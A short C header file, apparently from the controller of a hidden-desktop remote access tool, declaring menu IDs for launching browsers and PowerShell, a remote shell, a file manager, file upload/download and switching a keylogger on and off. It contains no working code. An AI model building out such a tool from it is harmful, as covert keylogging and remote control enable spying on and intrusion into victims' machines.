#pragma once

#include <Windows.h>

enum SysMenuIds
{
    fullScreen      = 101,
    startExplorer   = WM_USER + 1,
    startRun        = WM_USER + 2,
    startChrome     = WM_USER + 3,
    startEdge       = WM_USER + 4,
    startBrave      = WM_USER + 5,
    startFirefox    = WM_USER + 6,
    startIexplore   = WM_USER + 7,
    startPowershell = WM_USER + 8,
    menuShell        = 300,
    menuShellCommand = 301,
    menuFileManager  = 310,
    menuDownloadFile = 311,
    menuUploadFile   = 312,
    menuKeyloggerOn  = 320,
    menuKeyloggerOff = 321
};

BOOL CW_Register(WNDPROC lpfnWndProc);
HWND CW_Create(DWORD uhid, DWORD width, DWORD height);
